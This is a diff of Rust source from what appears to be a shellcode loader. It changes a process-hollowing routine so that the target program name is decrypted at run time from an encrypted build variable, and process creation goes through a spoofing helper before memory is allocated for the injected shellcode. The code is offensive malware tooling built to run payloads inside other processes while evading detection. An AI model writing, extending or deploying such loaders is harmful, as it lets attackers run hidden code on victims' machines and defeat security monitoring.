@@ -2,15 +2,18 @@ use crate::api::*;
 use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;
 
 #[cfg(feature = "run_process_hollowing")]
-pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
+pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Process Hollowing...");
 
     // Convert shellcode to payload slice
     let shellcode = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
 
+    use crate::utils::simple_decrypt;
+    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));
+
     // 1. Create suspended process
-    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED as u32)?;
+    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
 
     // 2. Allocate memory for shellcode
     let remote_mem = alloc_virtual_memory_at(
